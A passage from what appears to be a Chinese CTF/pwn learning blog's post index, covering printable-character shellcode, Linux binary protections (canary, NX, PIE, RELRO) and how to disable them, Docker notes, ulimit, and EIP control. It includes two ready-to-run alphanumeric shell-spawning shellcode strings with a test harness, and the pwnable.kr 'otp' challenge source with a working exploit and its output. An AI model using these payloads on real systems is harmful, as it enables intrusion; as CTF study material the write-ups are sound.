execve(elf绝对路径， elfname，其他) 也就是说，后一种直接用文件名就可执行！","tags":[{"name":"shell","slug":"shell","permalink":"http://yoursite.com/tags/shell/"}]},{"title":"全是可见字符的shellcode","date":"2017-09-30T04:19:10.000Z","path":"2017/09/30/全是可见字符的shellcode/","text":"最近做了pwnable.kr上的一道题，收获颇丰！其中就有对全是可见字符组成的shellcode的总结，也就是本文。 全是可见字符的shellcode shellcode1: PYj0X40PPPPQPaJRX4Dj0YIIIII0DN0RX502A05r9sOPTY01A01RX500D05cFZBPTY01SX540D05ZFXbPTYA01A01SX50A005XnRYPSX5AA005nnCXPSX5AA005plbXPTYA01Tx shellcode2: PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIRJTKV8MIPR2FU86M3SLIZG2H6O43SX30586OCRCYBNLIM3QBKXDHS0C0EPVOE22IBNFO3CBH5P0WQCK9KQXMK0AA 实验首先写一个test.c文件: 123456int main()&#123;// char shellcode[] = \"PYj0X40PPPPQPaJRX4Dj0YIIIII0DN0RX502A05r9sOPTY01A01RX500D05cFZBPTY01SX540D05ZFXbPTYA01A01SX50A005XnRYPSX5AA005nnCXPSX5AA005plbXPTYA01Tx\"; char shellcode[] = \"PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIRJTKV8MIPR2FU86M3SLIZG2H6O43SX30586OCRCYBNLIM3QBKXDHS0C0EPVOE22IBNFO3CBH5P0WQCK9KQXMK0AA\"; (*(void (*)())shellcode)();&#125; 关闭NX保护: gcc -z execstack -o test test.c 运行之后获得shell 参考http://inaz2.hatenablog.com/entry/2014/07/11/004655","tags":[{"name":"shellcode","slug":"shellcode","permalink":"http://yoursite.com/tags/shellcode/"}]},{"title":"linux程序的常用保护机制","date":"2017-09-30T02:25:02.000Z","path":"2017/09/30/linux程序的常用保护机制/","text":"操作系统提供了许多安全机制来尝试降低或阻止缓冲区溢出攻击带来的安全风险，包括DEP、ASLR等。在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了DEP（Linux下对应NX）、ASLR（Linux下对应PIE）等机制，例如存在DEP（NX）的话就不能直接执行栈上的数据，存在ASLR的话各个系统调用的地址就是随机化的。 一、checksecchecksec是一个脚本软件，也就是用脚本写的一个文件，不到2000行，可用来学习shell。 源码参见 http://www.trapkit.de/tools/checksec.html https://github.com/slimm609/checksec.sh/ 下载方法之一为 wget https://github.com/slimm609/checksec.sh/archive/1.6.tar.gz checksec到底是用来干什么的？ 它是用来检查可执行文件属性，例如PIE, RELRO, PaX, Canaries, ASLR, Fortify Source等等属性。 checksec的使用方法： checksec –file /usr/sbin/sshd 一般来说，如果是学习二进制漏洞利用的朋友，建议大家使用gdb里peda插件里自带的checksec功能，如下： 下面我们就图中各个保护机制进行一个大致的了解。 二、CANNARY(栈保护)这个选项表示栈保护功能有没有开启。 栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。 gcc在4.2版本中添加了-fstack-protector和-fstack-protector-all编译参数以支持栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。 因此在编译时可以控制是否开启栈保护以及程度，例如： 1234gcc -o test test.c // 默认情况下，不开启Canary保护gcc -fno-stack-protector -o test test.c //禁用栈保护gcc -fstack-protector -o test test.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码 三、FORTIFYfority其实非常轻微的检查，用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets以及宽字符的变体。 _FORTIFY_SOURCE设为1，并且将编译器设置为优化1(gcc -O1)，以及出现上述情形，那么程序编译时就会进行检查但又不会改变程序功能 _FORTIFY_SOURCE设为2，有些检查功能会加入，但是这可能导致程序崩溃。 gcc -D_FORTIFY_SOURCE=1 仅仅只会在编译时进行检查 (特别像某些头文件 #include &lt;string.h&gt;) gcc -D_FORTIFY_SOURCE=2 程序执行时也会有检查 (如果检查到缓冲区溢出，就终止程序) 举个例子可能简单明了一些：一段简单的存在缓冲区溢出的C代码 123456void fun(char *s) &#123; char buf[0x100]; strcpy(buf, s); /* Don&apos;t allow gcc to optimise away the buf */ asm volatile(&quot;&quot; :: &quot;m&quot; (buf));&#125; 用包含参数-U_FORTIFY_SOURCE编译 1234567891011121308048450 &lt;fun&gt;: push %ebp ; mov %esp,%ebp sub $0x118,%esp ; 将0x118存储到栈上 mov 0x8(%ebp),%eax ; 将目标参数载入eax mov %eax,0x4(%esp) ; 保存目标参数 lea -0x108(%ebp),%eax ; 数组buf mov %eax,(%esp) ; 保存 call 8048320 &lt;strcpy@plt&gt; leave ; ret 用包含参数-D_FORTIFY_SOURCE=2编译 123456789101112131408048470 &lt;fun&gt;: push %ebp ; mov %esp,%ebp sub $0x118,%esp ; movl $0x100,0x8(%esp) ; 把0x100当作目标参数保存 mov 0x8(%ebp),%eax ; mov %eax,0x4(%esp) ; lea -0x108(%ebp),%eax ; mov %eax,(%esp) ; call 8048370 &lt;__strcpy_chk@plt&gt; leave ; ret 我们可以看到gcc生成了一些附加代码，通过对数组大小的判断替换strcpy, memcpy, memset等函数名，达到防止缓冲区溢出的作用。 总结下就有: 123gcc -o test test.c // 默认情况下，不会开这个检查gcc -D_FORTIFY_SOURCE=1 -o test test.c // 较弱的检查gcc -D_FORTIFY_SOURCE=2 -o test test.c // 较强的检查 四、NX（DEP）NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 工作原理如图：gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。例如： 123gcc -o test test.c // 默认情况下，开启NX保护gcc -z execstack -o test test.c // 禁用NX保护gcc -z noexecstack -o test test.c // 开启NX保护 在Windows下，类似的概念为DEP（数据执行保护），在最新版的Visual Studio中默认开启了DEP编译选项。 五、PIE（ASLR）一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。 内存地址随机化机制（address space layout randomization)，有以下三种情况 1230 - 表示关闭进程地址空间随机化。1 - 表示将mmap的基址，stack和vdso页面随机化。2 - 表示在1的基础上增加栈（heap）的随机化。 可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。 Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。 liunx下关闭PIE的命令如下： 1sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space gcc编译命令 12345gcc -o test test.c // 默认情况下，不开启PIEgcc -fpie -pie -o test test.c // 开启PIE，此时强度为1gcc -fPIE -pie -o test test.c // 开启PIE，此时为最高强度2gcc -fpic -o test test.c // 开启PIC，此时强度为1，不会开启PIEgcc -fPIC -o test test.c // 开启PIC，此时为最高强度2，不会开启PIE 说明： PIE最早由RedHat的人实现，他在连接起上增加了-pie选项，这样使用-fPIE编译的对象就能通过连接器得到位置无关可执行程序。fPIE和fPIC有些不同。可以参考Gcc和Open64中的-fPIC选项. gcc中的-fpic选项，使用于在目标机支持时，编译共享库时使用。编译出的代码将通过全局偏移表(Global OffsetTable)中的常数地址访存，动态装载器将在程序开始执行时解析GOT表项(注意，动态装载器操作系统的一部分，连接器是GCC的一部分)。而gcc中的-fPIC选项则是针对某些特殊机型做了特殊处理，比如适合动态链接并能避免超出GOT大小限制之类的错误。而Open64仅仅支持不会导致GOT表溢出的PIC编译。 gcc中的-fpie和-fPIE选项和fpic及fPIC很相似，但不同的是，除了生成为位置无关代码外，还能假定代码是属于本程序。通常这些选项会和GCC链接时的-pie选项一起使用。fPIE选项仅能在编译可执行码时用，不能用于编译库。所以，如果想要PIE的程序，需要你除了在gcc增加-fPIE选项外，还需要在ld时增加-pie选项才能产生这种代码。即gcc -fpie -pie来编译程序。单独使用哪一个都无法达到效果。 六、RELRO在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。 所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处. GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术: read only relocation。大概实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读. 设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。 gcc编译： 1234gcc -o test test.c // 默认情况下，是Partial RELROgcc -z norelro -o test test.c // 关闭，即No RELROgcc -z lazy -o test test.c // 部分开启，即Partial RELROgcc -z now -o test test.c // 全部开启，即 七、总结各种安全选择的编译参数如下： NX：-z execstack / -z noexecstack (关闭 / 开启) Canary：-fno-stack-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启) PIE：-no-pie / -pie (关闭 / 开启) RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启)","tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"docker操作指南","date":"2017-09-27T16:21:40.000Z","path":"2017/09/28/docker操作指南/","text":"1、运行ubuntu等容器 后台运行系统镜像 docker run -it -d ubuntu 直接运行镜像，退出后这个镜像也停止 docker run -it ubuntu 映射端口(22端口映射出来，一般代表可以通过ssh登录) docker run -it -p 80:80 2222:22 -d ubuntu 映射文件夹 docker run -it -v /outer/tmp:/inner/tmp -d ubuntu 选择网络模式 docker run -it --net=&quot;host&quot; -d ubuntu 2、操作容器 直接运行命令 docker exec -it Container-ID /bin/cat flag attach到容器中（限制极大，多个终端同时进行操纵时，容易发生冲突） docker attach-it Container-ID 进入容器中运行指令 docker exec -it Container-ID /bin/bash 从容器内拷贝文件到主机上 docker cp \\&lt;containerId>:/file/path/within/container /host/path/target 从容器内拷贝文件到主机上 docker cp /host/path/target \\&lt;containerId>:/file/path/within/container 3、网络模式（1） bridge模式 使用—net=bridge指定，为Docker的默认设置。这种模式是将容器用docker的网桥连接起来。 作为最常规的格式，bridge模式已经可以满足Docker容器最基本的使用需求。然而其在于外界通信使用NAT协议，增加了通信的复杂性，在复杂的场景下使用会有诸多限制。 （2） host模式 host模式下，容器不会拥有自己的网络命名空间。Docker容器中的进程处于宿主机的网络环境中，此时Docker容器和宿主机之间网络没有映射关系，外界可以通过该主机的IP地址、端口等进行Docker容器的访问。当然，除了network namespace外，其他内容宿主机是隔离的。host模式不用地址映射，可以直接使用宿主机的IP。但是也降低了隔离性，而且由于网络资源一直被竞争，所以可能造成网络的短暂不可用问题。 （3） container模式 container模式是指新创建的容器与已有的容器共享网络信息。在此种模式下，新创建的容器与指定的容器共享IP、端口等。当然，两个容器之间除了网络信息共享外，其它内容均不可共用。由于在这种模式下，两个容器的进程使用回环网卡通信，所以通讯速率加快了。container模式的主要用于部署多个相关的应用，最好能成为一个整体。由于container模式的特点，导致了这种模式隔离性不强，可能会存在安全隐患。 （4） none模式 none模式时，Docker拥有网络协议栈，但是没有对协议栈进行配置。这时，Docker容器的网卡以及IP，均为用户所配置。一般而言，当未给使用这种模式的容器进行网络配置时，用户无法正常使用容器进程，但是优点也很明显，它给用户最大的自由度来自定义容器的网络环境。 4、docker CMD执行 容器内没有后台服务的概念提到 CMD 就不得不提容器中应用在前台执行和后台执行的问题。这是初学者常出现的一个混淆。 Docker 不是虚拟机，容器中的应用都应该以前台执行，而不是像虚拟机、物理机里面那样， 用 upstart/systemd 去启动后台服务，容器内没有后台服务的概念。 一些初学者将 CMD 写为： CMD service nginx start 然后发现容器执行后就立即退出了。甚至在容器内去使用 systemctl 命令结果却发现根本执 行不了。这就是因为没有搞明白前台、后台的概念，没有区分容器和虚拟机的差异，依旧在 以传统虚拟机的角度去理解容器。 对于容器而言，其启动程序就是容器应用进程，容器就是为了主进程而存在的，主进程退 出，容器就失去了存在的意义，从而退出，其它辅助进程不是它需要关心的东西。 而使用 service nginx start 命令，则是希望 upstart 来以后台守护进程形式启动 nginx 服 务。而刚才说了 CMD service nginx start 会被理解为 CMD [ &quot;sh&quot;, &quot;-c&quot;, &quot;service nginx start&quot;] ，因此主进程实际上是 sh 。那么当 service nginx start 命令结束后， sh 也就结 束了， sh 作为主进程退出了，自然就会令容器退出。 正确的做法是直接执行 nginx 可执行文件，并且要求以前台形式运行。比如： CMD [&quot;nginx&quot;, &quot;-g&quot;, &quot;daemon off;&quot;] 或者: nginx -g &quot;daemon off;&quot; 5、解决上述问题的办法5.1 supervisor最近看了一个github项目，完美解决这类问题 https://github.com/nickistre/docker-lamp/tree/ubuntu-14.04 主要做法是加入了supervisd。CMD中的指令一般只有一条，所以建议使用run.sh 123456RUN apt-get install -y supervisorRUN mkdir -p /var/log/supervisorADD supervisord.conf /etc/#ADD test.conf /etc/supervisord/conf.d/CMD [&quot;supervisord&quot;, &quot;-n&quot;]#CMD [&quot;/run.sh&quot;] 改密码的方法 1RUN echo &apos;root:changeme&apos; | chpasswd 而语法规则可以参考文档http://supervisord.org/configuration.html 12345678910111213141516171819202122232425262728293031323334353637383940[supervisord];logfile=/var/log/supervisor/supervisord-nobody.log ; (main log file;default $CWD/supervisord.log);logfile_maxbytes=50MB ; (max main logfile bytes b4 rotation;default 50MB);logfile_backups=10 ; (num of main logfile rotation backups;default 10);loglevel=info ; (log level;default info; others: debug,warn,trace);pidfile=/var/run/supervisord.pid ; (supervisord pidfile;default supervisord.pid)nodaemon=true ; (start in foreground if true;default false);user=nobody[rpcinterface:supervisor]supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface;[unix_http_server];file = /supervisor.sock;chmod = 0777;chown= nobody:nogroup;username = user;password = 123[inet_http_server]port = 127.0.0.1:9001[supervisorctl];serverurl=unix:///tmp/supervisor.sockserverurl=http://127.0.0.1:9001[program:apache2]command=/bin/bash -c &quot;source /etc/apache2/envvars &amp;&amp; exec /usr/sbin/apache2 -DFOREGROUND&quot;numprocs=1autostart=true;autostart=true ; start at supervisord start (default: true);autorestart=true ; retstart at unexpected quit (default: true);startretries=3 ; max # of serial start failures (default 3)[program:mysql]command = /usr/bin/pidproxy /var/run/mysqld/mysqld.pid /usr/bin/mysqld_safenumprocs=1autostart=true 5.2 无限循环main.sh 12345678910111213#!/bin/bashecho &apos;[+] Starting mysql...&apos;service mysql startecho &apos;[+] Starting apache&apos;service apache2 startwhile truedo tail -f /var/log/apache2/*.log exit 0done run.sh 12345678910111213141516171819202122#!/bin/bash#sshdecho &quot;=&gt; start sshd&quot;exec /usr/sbin/sshd &amp;echo &quot;=&gt; sshd started&quot;VOLUME_HOME=&quot;/var/lib/mysql&quot;sed -ri -e &quot;s/^upload_max_filesize.*/upload_max_filesize = $&#123;PHP_UPLOAD_MAX_FILESIZE&#125;/&quot; \\ -e &quot;s/^post_max_size.*/post_max_size = $&#123;PHP_POST_MAX_SIZE&#125;/&quot; /etc/php5/apache2/php.iniif [[ ! -d $VOLUME_HOME/mysql ]]; then echo &quot;=&gt; An empty or uninitialized MySQL volume is detected in $VOLUME_HOME&quot; echo &quot;=&gt; Installing MySQL ...&quot; mysql_install_db &gt; /dev/null 2&gt;&amp;1 echo &quot;=&gt; Done!&quot; /create_mysql_admin_user.shelse echo &quot;=&gt; Using an existing volume of MySQL&quot;fiexec supervisord -n Start-apache2.sh 123#!/bin/bashsource /etc/apache2/envvarsexec apache2 -D FOREGROUND Start-mysql.sh 12#!/bin/bashexec mysqld_safe 在脚本中，最好使用下面的这类后台指令 1exec /usr/sbin/sshd &amp; 在shell中，内建（builtin）命令exec，格式如下： 1exec [-cl] [-a name] [command [arguments]]1 exec命令，如果指定了command，它就会取代当前的shell而不是创建新的进程，所以命令执行完毕后shell也就退出了。如果设置了“-l”即login选项，在command的第0个参数前会添加符号“-”，这是login所需的。如果设置了“-c”即clear选项，command命令将在一个空的环境中执行。如果指定了“-a name”选项，name会作为第0个参数传给command。若没有指定command，可以使用重定向来影响当前的shell。重定向成功时退出状态为0，否则为1。 exec后面的命令如果是多个简单命令组合而成的复合命令，只执行第一个命令，可以把这些符合命令写入shell脚本中，然后通过exec执行这个脚本，此时脚本中所有的命令都会执行。","tags":[{"name":"docker","slug":"docker","permalink":"http://yoursite.com/tags/docker/"}]},{"title":"docker简介","date":"2017-09-27T16:04:31.000Z","path":"2017/09/28/docker简介/","text":"此文作为我以前一篇文章的裁剪，没有十分详尽地展现所有内容，对此我深感抱歉！ 1 Docker容器技术1.1 Docker容器技术概述Docker是一种新型的容器技术，已经在成为云计算的核心技术之一。Docker是为了解决依赖地域问题而产生的。Docker使用命名空间将各个容器进行隔离，并使用Namespace来对端口、层次进行隔离，使用AUFS技术进行分层并复用共同的层，以达到减少空间使用量。 1.2 Docker网络通信Docker容器有以下几种网络模式。 （1） bridge模式 使用—net=bridge指定，为Docker的默认设置。这种模式是将容器用docker的网桥连接起来。 作为最常规的格式，bridge模式已经可以满足Docker容器最基本的使用需求。然而其在于外界通信使用NAT协议，增加了通信的复杂性，在复杂的场景下使用会有诸多限制。 （2） host模式 host模式下，容器不会拥有自己的网络命名空间。Docker容器中的进程处于宿主机的网络环境中，此时Docker容器和宿主机之间网络没有映射关系，外界可以通过该主机的IP地址、端口等进行Docker容器的访问。当然，除了network namespace外，其他内容宿主机是隔离的。host模式不用地址映射，可以直接使用宿主机的IP。但是也降低了隔离性，而且由于网络资源一直被竞争，所以可能造成网络的短暂不可用问题。 （3） container模式 container模式是指新创建的容器与已有的容器共享网络信息。在此种模式下，新创建的容器与指定的容器共享IP、端口等。当然，两个容器之间除了网络信息共享外，其它内容均不可共用。由于在这种模式下，两个容器的进程使用回环网卡通信，所以通讯速率加快了。container模式的主要用于部署多个相关的应用，最好能成为一个整体。由于container模式的特点，导致了这种模式隔离性不强，可能会存在安全隐患。 （4） none模式 none模式时，Docker拥有网络协议栈，但是没有对协议栈进行配置。这时，Docker容器的网卡以及IP，均为用户所配置。一般而言，当未给使用这种模式的容器进行网络配置时，用户无法正常使用容器进程，但是优点也很明显，它给用户最大的自由度来自定义容器的网络环境。 1.3 Docker与传统虚拟化比较Docker与传统的虚拟化技术有着不同，其容器是虚拟的是进程，而这些进程的依赖关系等都已经在布置容器时配置好。用户运行容器，就相当于直接利用宿主机的操作系统运行这些进程。而传统的虚拟化技术是重新虚拟一个操作系统，再在操作系统上运行这些程序进程。如图1所示，展现了Docker与传统虚拟化方式在实现上的不同。 ​ 图 1 传统虚拟化技术和Docker比较 从图中可知，Docker与传统的虚拟化技术最大的区别是：传统的虚拟化技术是对操作系统的虚拟化；而Docker是复用了宿主机操作系统，相当于对应用的虚拟化。 当然，应用程序运行时的组合方式有很多，不局限于上面所讲到的两种。图2展示了可能的组合方式。 图2 运行应用程序是可能的层次组合 当然，Docker容器技术越来越受各企业的青睐，原因是它比传统的虚拟化技术有更多的优势。首先，Docker容器技术使得其不需要创建虚拟机，而创建虚拟机所耗费的时间很长，这就间接地降低了容器的启动时长，当然容器技术也让创建容器、删除容器变得迅捷；其次，Docker可以打包每个组件及其依赖，因而Docker在很大程度上解决操作系统层面的冲突依赖、缺少依赖、平台依赖等依赖问题；最后，Docker能够充分利用系统资源，因为Docker较传统的虚拟化技术省却了最耗系统资源的操作系统。 1.4 Docker操作Docker操作最主要的就是docker和docker daemon这两个部分，通过这两个部分，用户可以快速实现容器和镜像之间的操作。由于docke和docker daemon共用同一个二进制组件，所以docker在使用的时候一般需要root权限。 从docker命令使用出发，梳理出如图3所示的命令结构图。 图3 Docker命令结构图 ​ 从图中可以看出，docker操作主要围绕着镜像和容器展开。通常创建可移植性的镜像，需要通过Dockerfile编写相应配置文件，然后创建之后打上标签，上传到Docker仓库中。下次需要运行时，只需要简单地将该镜像拉取至Docker宿主机上，然后运行即可。 ​ 总而言之，Docker容器技术使得应用程序的可移植性大大增强，同时还为管理人员创建应用、启动应用、更新应用提供了方便。","tags":[{"name":"docker","slug":"docker","permalink":"http://yoursite.com/tags/docker/"}]},{"title":"ulimit在pwn题中的应用","date":"2017-09-27T12:01:48.000Z","path":"2017/09/27/ulimit在pwn题中的应用/","text":"1、ulimit简介Linux对于每个用户，系统限制其最大进程数。为提高性能，可以根据设备资源情况，设置各linux 用户的最大进程数 可以用ulimit -a 来显示当前的各种用户进程限制。 下表是我的虚拟机各个参数的限制 12345678910111213141516core file size (blocks, -c) 0data seg size (kbytes, -d) unlimitedscheduling priority (-e) 0file size (blocks, -f) unlimitedpending signals (-i) 7744max locked memory (kbytes, -l) 64max memory size (kbytes, -m) unlimitedopen files (-n) 1024pipe size (512 bytes, -p) 8POSIX message queues (bytes, -q) 819200real-time priority (-r) 0stack size (kbytes, -s) 8192cpu time (seconds, -t) unlimitedmax user processes (-u) 7744virtual memory (kbytes, -v) unlimitedfile locks (-x) unlimited 1.1 ulimit参数ulimit：显示（或设置）用户可以使用的资源的限制（limit），这限制分为软限制（当前限制）和硬限制（上限），其中硬限制是软限制的上限值，应用程序在运行过程中使用的系统资源不超过相应的软限制，任何的超越都导致进程的终止。 参数 描述 ulimited 不限制用户可以使用的资源，但本设置对可打开的最大文件数（max open files）和可同时运行的最大进程数（max user processes）无效 -a 列出所有当前资源极限 -c 设置core文件的最大值.单位:blocks -d 设置一个进程的数据段的最大值.单位:kbytes -f Shell 创建文件的文件大小的最大值，单位：blocks -h 指定设置某个给定资源的硬极限。如果用户拥有 root 用户权限，可以增大硬极限。任何用户均可减少硬极限 -l 可以锁住的物理内存的最大值 -m 可以使用的常驻内存的最大值,单位：kbytes -n 每个进程可以同时打开的最大文件数 -p 设置管道的最大值，单位为block，1block=512bytes -s 指定堆栈的最大值：单位：kbytes -S 指定为给定的资源设置软极限。软极限可增大到硬极限的值。如果 -H 和 -S 标志均未指定，极限适用于以上二者 -t 指定每个进程所使用的秒数,单位：seconds -u 可以运行的最大并发进程数 -v Shell可使用的最大的虚拟内存，单位：kbytes 用ulimit -s unlimited 就可以关闭aslr 1.2 ulimit设置【临时】其他建议设置成无限制（unlimited）的一些重要设置是： 数据段长度：ulimit -d unlimited 最大内存大小：ulimit -m unlimited 堆栈大小：ulimit -s unlimited CPU 时间：ulimit -t unlimited 虚拟内存：ulimit -v unlimited 暂时地，适用于通过 ulimit 命令登录 shell 会话期间。 1.3 永久设置相关选项【永久】永久地，通过将一个相应的 ulimit 语句添加到由登录 shell 读取的文件中， 即特定于 shell 的用户资源文件，如： 解除 Linux 系统的最大进程数和最大文件打开数限制： 123456vi /etc/security/limits.conf# 添加如下的行* soft noproc 11000* hard noproc 11000* soft nofile 4100* hard nofile 4100 ​ # 添加如下的行 ​ * soft noproc 11000 ​ * hard noproc 11000 ​ * soft nofile 4100 ​ * hard nofile 4100 ​ 说明：* 代表针对所有用户，noproc 是代表最大进程数，nofile 是代表最大文件打开数 让 SSH 接受 Login 程式的登入，方便在 ssh 客户端查看 ulimit -a 资源限制： ​ a、vi /etc/ssh/sshd_config ​ 把 UserLogin 的值改为 yes，并把 # 注释去掉 ​ b、重启 sshd 服务： ​ /etc/init.d/sshd restart 修改所有 linux 用户的环境变量文件： 12345678vi /etc/profileulimit -u 10000ulimit -n 4096ulimit -d unlimitedulimit -m unlimitedulimit -s unlimitedulimit -t unlimitedulimit -v unlimited 保存后运行#source /etc/profile 使其生效 解除程序能打开的文件个数限制 有时候在程序里面需要打开多个文件，进行分析，系统一般默认数量是1024，（用ulimit -a可以看到）对于正常使用是够了，但是对于程序来讲，就太少了。 修改2个文件。 /etc/security/limits.conf vi /etc/security/limits.conf 加上： 12* soft nofile 8192* hard nofile 20480 /etc/pam.d/login session required /lib/security/pam_limits.so 另外确保/etc/pam.d/system-auth文件有下面内容 session required /lib/security/$ISA/pam_limits.so 这一行确保系统会执行这个限制。 一般用户的.bash_profile #ulimit -n 1024 重新登陆ok 2、ulimit在pwn中的应用说到ulimit在pwn中的应用，这里就不得不提到pwnable.kr上的一道题otp： 题目描述如下 I made a skeleton interface for one time password authentication system.I guess there are no mistakes.could you take a look at it? hint : not a race condition. do not bruteforce. ssh otp@pwnable.kr -p2222 (pw:guest) 该题已经给出了源码！通过源码以及既定的思维方式，一般很难找到这题的利用方法。这题的利用方式就是用ulimit设置文件size的最大值。 otp.c源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;int main(int argc, char* argv[])&#123; char fname[128]; unsigned long long otp[2]; if(argc!=2)&#123; printf(\"usage : ./otp [passcode]\\n\"); return 0; &#125; int fd = open(\"/dev/urandom\", O_RDONLY); if(fd==-1) exit(-1); if(read(fd, otp, 16)!=16) exit(-1); close(fd); sprintf(fname, \"/tmp/%llu\", otp[0]); FILE* fp = fopen(fname, \"w\"); if(fp==NULL)&#123; exit(-1); &#125; fwrite(&amp;otp[1], 8, 1, fp); fclose(fp); printf(\"OTP generated.\\n\"); unsigned long long passcode=0; FILE* fp2 = fopen(fname, \"r\"); if(fp2==NULL)&#123; exit(-1); &#125; fread(&amp;passcode, 8, 1, fp2); fclose(fp2); if(strtoul(argv[1], 0, 16) == passcode)&#123; printf(\"Congratz!\\n\"); system(\"/bin/cat flag\"); &#125; else&#123; printf(\"OTP mismatch\\n\"); &#125; unlink(fname); return 0;&#125; exp.py 12import subprocesssubprocess.Popen(['/home/otp/otp', ''], stderr=subprocess.STDOUT) 利用 otp@ubuntu:~$ ulimit -f 0otp@ubuntu:~$ python /tmp/otp/exp.pyotp@ubuntu:~$ OTP generated.Congratz!Darn... I always forget to check the return value of fclose() :(","tags":[{"name":"shell","slug":"shell","permalink":"http://yoursite.com/tags/shell/"}]},{"title":"控制eip的方法","date":"2017-09-26T12:36:33.000Z","path":"2017/09/26/控制eip的方法/","text":"最近做了一些pwnable上的题，得到了一些微小的结论，特意与大家分享一下。 1、控制eip能够做什么一般而言，作为pwn手小白，最希望的就是控制eip了，而控制eip究竟能做什么呢？ 控制eip，相当于就控制了程序的执行流程，从而获得了程序的最高权限，甚至能够绕过操作系统上的安全限制，直接获取用户shell或进行破坏性操作。 而如果我们能够控制ctf题目中的eip，我们会进行怎样的操作呢? 如果程序有shell地址，直接跳转至shell地址处，获得shell 如果程序没有shell，我们能够构造rop链，一步步地更改寄存器、填充栈中值。最后也是获取shell 如果程序NX保护没开，就可以直接跳转至栈中进行shellcode执行 如果某个具有可执行地址段被写入了shellcode，我们也可以跳转至此获取shell 2、如何控制eip2.1 通过修改返回地址控制eip一般通过栈溢出的方式、堆溢出造成的任意地址写功能、程序自身逻辑造成的任意地址写等错误来修改返回地址 retn指令本来就是pop eip，如果能够在函数返回之前，将ret_addr替换为你想其执行的地址，就能够控制eip ​ 0xffffffe4| ebp | ​ 0xffffffe8| ret_addr | 2.2 通过栈迁移的方式控制eip所谓栈迁移，就是由于程序中有ebp，进而可以在程序返回后进入上一个栈帧中。 如果我们能够控制ebp中的值（也即控制[\\$ebp]），那么在栈帧迁移的时候（也就是在leave ret指令执行的时候），我们就控制了[[\\$ebp]+0x4]的值，而这个值实际上是上一个栈帧的返回地址。然后上一个栈帧在返回的时候，就控制了eip ​ 0xfffffee4 | 0xffffffe4 | ​ 0xfffffee8 | ret_addr | 此栈帧 ​ …… ​ 0xffffffe0 | | 上一个栈帧 ​ 0xffffffe4 | ebp | 上一个栈帧的起始地址","tags":[]},{"title":"工具大全","date":"2017-09-25T03:43:30.000Z","path":"2017/09/25/工具大全/","text":"shellcode脚本网站​ http://shell-storm.org/shellcode/ ARM学习网站​ http://www.davespace.co.uk/arm/introduction-to-arm/","tags":[]},{"title":"论canary的几种玩法","date":"2017-09-23T13:58:51.000Z","path":"2017/09/23/论canary的几种玩法/","text":"此文摘抄于veritas501的博文 http://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/ 里面讨论了我所知的几种关于canary的玩法，我目前不知道的就等我以后什么时候知道了再补充吧。 先说说canarycanary直译就是金丝雀，为什么是叫金丝雀？ 17世纪，英国矿井工人发现，金丝雀对瓦斯这种气体十分敏感。空气中哪怕有极其微量的瓦斯，金丝雀也会停止歌唱；而当瓦斯含量超过一定限度时，虽然鲁钝的人类毫无察觉，金丝雀却早已毒发身亡。当时在采矿设备相对简陋的条件下，工人们每次下井都会带上一只金丝雀作为“瓦斯检测指标”，以便在危险状况下紧急撤离。 而程序里的canary就是来检测栈溢出的。 检测的机制是这样的： 1.程序从一个神奇的地方取出一个4（eax）或8（rax）节的值，在32位程序上，你可能会看到： 在64位上，你可能会看到： 总之，这个值你不能实现得到或预测，放到站上以后，eax中的副本也会被清空（xor eax,eax） 2.程序正常的走完了流程，到函数执行完的时候，程序会再次从那个神奇的地方把canary的值取出来，和之前放在栈上的canary进行比较，如果因为栈溢出什么的原因覆盖到了canary而导致canary发生了变化则直接终止程序。 在栈中大致是这样一个画风： 绕过canary - 格式化字符串格式化字符串能够实现任意地址读写，具体的实现可以参考我blog中关于格式化字符串的总结，格式化字符串的细节不是本文讨论的重点。 